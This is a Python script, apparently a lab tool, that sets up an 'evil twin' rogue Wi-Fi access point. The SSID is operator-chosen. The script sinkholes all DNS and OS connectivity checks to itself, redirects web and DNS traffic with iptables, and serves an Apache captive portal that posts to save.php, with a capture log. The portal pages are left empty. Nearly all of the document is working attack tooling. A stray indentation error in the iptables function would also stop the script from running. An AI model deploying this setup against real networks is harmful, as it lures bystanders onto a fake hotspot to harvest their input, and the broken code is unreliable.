import argparse
import ipaddress
import os
import shutil
import signal
import subprocess
import sys
from pathlib import Path

ETC_DIR = Path('/etc/evil-twin')
DNSMASQ_CONF = ETC_DIR / 'dnsmasq.conf'
HOSTAPD_CONF = ETC_DIR / 'hostapd.conf'
APACHE_SITE = Path('/etc/apache2/sites-available/captive.conf')
CAPTIVE_DIR = Path('/var/www/captive')
CAPTIVE_INDEX = CAPTIVE_DIR / 'index.html'
CAPTIVE_SAVE = CAPTIVE_DIR / 'save.php'
CAPTIVE_LOG  = Path('/var/log/ca.log')

processes = []  
iptables_rules = [] 


def run(cmd, check=True, capture=False, quiet=False, env=None):
    """Run a system command. When quiet=True, suppress stdout/stderr unless failing."""
    if quiet:
        if os.environ.get('ET_DEBUG'):
            print(f"[+] $ {' '.join(cmd)}")
        if capture:
            return subprocess.run(cmd, check=check, text=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
        return subprocess.run(cmd, check=check,stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, env=env)
    else:
        print(f"[+] $ {' '.join(cmd)}")
        if capture:
            return subprocess.run(cmd, check=check, text=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
        return subprocess.run(cmd, check=check, env=env)


def which(prog):
    return shutil.which(prog) is not None

def require_root():
    if os.geteuid() != 0:
        print("[!] This script must be run as root (sudo). Aborting.")
        sys.exit(1)

def confirm(prompt: str) -> bool:
    try:
        ans = input(f"{prompt} [y/N]: ").strip().lower()
        return ans in ('y','yes')
    except EOFError:
        return False


def ipcalc(network_cidr: str):
    net = ipaddress.ip_network(network_cidr, strict=False)

    gw_ip = str(list(net.hosts())[-1])
   
    hosts = list(net.hosts())
    if len(hosts) < 50:
        dhcp_start = hosts[min(5, len(hosts)-2)] 
        dhcp_end   = hosts[-2]
    else:
        dhcp_start = hosts[9]
        dhcp_end_idx = min(199, len(hosts)-2)
        dhcp_end   = hosts[dhcp_end_idx]
    return net, gw_ip, str(dhcp_start), str(dhcp_end)


def ensure_packages():
    pkgs1 = ["apache2","php","libapache2-mod-php"]
    pkgs2 = ["hostapd","dnsmasq","lighttpd","php"]
    print("[+] Installing packages…")
    env = os.environ.copy()
    env["DEBIAN_FRONTEND"] = "noninteractive"

    run(["apt-get","update","-qq"], quiet=True, env=env)
    run(["apt-get","install","-y","-qq", *pkgs1], quiet=True, env=env)
    run(["apt-get","install","-y","-qq", *pkgs2], quiet=True, env=env)
   
    for svc in ("hostapd","dnsmasq"):
        try:
            run(["systemctl","stop",svc], check=False, quiet=True)
            run(["systemctl","disable",svc], check=False, quiet=True)
        except Exception:
            pass
  
    run(["systemctl","start","apache2"], quiet=True)
    run(["a2enmod","rewrite"], quiet=True)
    run(["a2enmod","headers"], quiet=True)
    run(["systemctl","restart","apache2"], quiet=True)
    print("[+] Packages ready.") 


def ensure_iface_exists(iface: str):
    try:
        run(["ip","link","show",iface], quiet=True)
    except subprocess.CalledProcessError:
        print(f"[!] Interface '{iface}' not found. Aborting.")
        sys.exit(1)
    if iface.startswith('eth'):
        print(f"[!] '{iface}' looks like a wired interface. For AP mode use a wireless iface (e.g., wlan0/wlp*).")


def config_iface(iface: str, net, gw_ip: str):
    cidr = net.prefixlen
    run(["ip","link","set",iface,"down"], quiet=True)
    run(["ip","addr","flush","dev",iface], quiet=True)
    run(["ip","addr","add",f"{gw_ip}/{cidr}","dev",iface], quiet=True)
    run(["ip","link","set",iface,"up"], quiet=True)


def write_dnsmasq(iface: str, gw_ip: str, dhcp_start: str, dhcp_end: str):
    ETC_DIR.mkdir(parents=True, exist_ok=True)
    content = f"""
interface={iface}
bind-interfaces
no-resolv
log-queries

# DHCP
dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{gw_ip}
dhcp-option=6,{gw_ip}

# DNS sinkhole -> captive portal IP
address=/#/{gw_ip}
address=/captive.apple.com/{gw_ip}
address=/www.msftconnecttest.com/{gw_ip}
address=/connectivitycheck.gstatic.com/{gw_ip}
""".strip()+"\n"
    DNSMASQ_CONF.write_text(content)
    print(f"[+] Wrote {DNSMASQ_CONF}")


def write_hostapd(iface: str, ssid: str, channel: int):
    content = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wmm_enabled=0
""".strip()+"\n"
    HOSTAPD_CONF.write_text(content)
    print(f"[+] Wrote {HOSTAPD_CONF}")


def setup_captive_folder():
    if CAPTIVE_DIR.exists():
        if confirm(f"Folder {CAPTIVE_DIR} exists. Remove and recreate?"):
            shutil.rmtree(CAPTIVE_DIR)
        else:
            print("[i] Leaving existing captive folder in place.")
    CAPTIVE_DIR.mkdir(parents=True, exist_ok=True)
    # create empty files if not present
    CAPTIVE_INDEX.touch(exist_ok=True)
    CAPTIVE_SAVE.touch(exist_ok=True)
    print(f"[+] Ensured {CAPTIVE_INDEX} and {CAPTIVE_SAVE} (empty). Add your portal HTML/PHP.")

    # log file & permissions
    CAPTIVE_LOG.touch(exist_ok=True)
    run(["chown","www-data:www-data",str(CAPTIVE_LOG)], quiet=True)
    run(["chmod","640",str(CAPTIVE_LOG)], quiet=True)


def write_apache_site():
    vhost = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        AllowOverride All
        Require all granted
    </Directory>

    # CNA endpoints
    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204 /var/www/captive/index.html
    Alias /connecttest.txt /var/www/captive/index.html

    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/save\.php$
    RewriteRule ^.*$ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
</VirtualHost>
""".strip()+"\n"
    APACHE_SITE.write_text(vhost)
    print(f"[+] Wrote {APACHE_SITE}")
    run(["a2ensite","captive.conf"], quiet=True)
    run(["a2dissite","000-default.conf"], check=False, quiet=True)
    run(["systemctl","reload","apache2"], quiet=True) 


def add_iptables_rules(iface: str):
    rules = [
        ["iptables","-t","nat","-A","PREROUTING","-i",iface,"-p","tcp","--dport","80","-j","REDIRECT","--to-ports","80"],
        ["iptables","-t","nat","-A","PREROUTING","-i",iface,"-p","udp","--dport","53","-j","REDIRECT","--to-ports","53"],
        ["iptables","-t","nat","-A","PREROUTING","-i",iface,"-p","tcp","--dport","53","-j","REDIRECT","--to-ports","53"],
    ]
    for rule in rules:
        run(rule, quiet=True)
    iptables_rules.extend(rules)
     print("[+] Set Up Iptables")


def del_iptables_rules():
    # reverse order when deleting (-D instead of -A)
    for rule in reversed(iptables_rules):
        delete = rule.copy()
        delete[4] = '-D'  # replace -A with -D (index 4 in our construction)
        try:
            run(delete, check=False, quiet=True)
        except Exception:
            pass

def start_processes():
    # dnsmasq
    p_dns = subprocess.Popen(["dnsmasq","-C",str(DNSMASQ_CONF)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    processes.append(("dnsmasq", p_dns))
    print("[+] Started dnsmasq")
    # hostapd (foreground)
    p_apd = subprocess.Popen(["hostapd", str(HOSTAPD_CONF)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    processes.append(("hostapd", p_apd))
    print("[+] Started hostapd")


def tail_process(name, proc):
    try:
        for line in proc.stdout:
            print(f"[{name}] {line}", end='')
    except Exception:
        pass


def cleanup(iface: str):
    print("\n[>] Cleaning up…")
    del_iptables_rules()

    for name, proc in processes:
        try:
            print(f"[>] Stopping {name} (pid={proc.pid})")
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
        except Exception:
            pass

    # flush iface
    try:
        run(["ip","addr","flush","dev",iface], check=False)
        run(["ip","link","set",iface,"down"], check=False)
        run(["ip","link","set",iface,"up"], check=False)
    except Exception:
        pass
    print("[+] Cleanup done.")


def main():
    parser = argparse.ArgumentParser(description="Evil Twin LAB bootstrapper (authorized testing only)")
    parser.add_argument('-n','--network', required=True, help='CIDR, e.g. 192.168.50.0/24 or 192.168.1.0/23')
    parser.add_argument('--ssid', required=True, help='SSID to broadcast')
    parser.add_argument('--channel', type=int, default=6, help='Wi‑Fi channel (2.4GHz)')
    parser.add_argument('--iface', default='wlan0', help='Wireless interface to use (default: wlan0)')
    args = parser.parse_args()

    require_root()

    if not which('iptables'):
        print('[!] iptables not found. Install iptables first.')
        sys.exit(1)

    ensure_iface_exists(args.iface)

    # 1) packages
    ensure_packages()

    # 2) network math
    net, gw_ip, dhcp_start, dhcp_end = ipcalc(args.network)
    print(f"[i] Network: {net} | GW/DNS: {gw_ip} | DHCP: {dhcp_start} → {dhcp_end}")

    # 3) iface config
    config_iface(args.iface, net, gw_ip)

    # 4) write configs
    write_dnsmasq(args.iface, gw_ip, dhcp_start, dhcp_end)
    write_hostapd(args.iface, args.ssid, args.channel)

    # 5) captive + apache vhost
    setup_captive_folder()
    write_apache_site()

    # 6) iptables
    add_iptables_rules(args.iface)

    
    start_processes()

    def handle_sigint(signum, frame):
        cleanup(args.iface)
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)
    signal.signal(signal.SIGTERM, handle_sigint)

    print("[+] Running. Press Ctrl+C to stop and clean up…\n")

   
    try:
        
        while True:
            alive = False
            for name, proc in processes:
                if proc.poll() is None:
                    alive = True
                    
                    try:
                        if proc.stdout and not proc.stdout.closed:
                            while True:
                                line = proc.stdout.readline()
                                if not line:
                                    break
                                print(f"[{name}] {line}", end='')
                    except Exception:
                        pass
            if not alive:
                print('[!] Processes exited unexpectedly. Performing cleanup…')
                break
    except KeyboardInterrupt:
        pass
    finally:
        cleanup(args.iface)


if __name__ == '__main__':
    main()
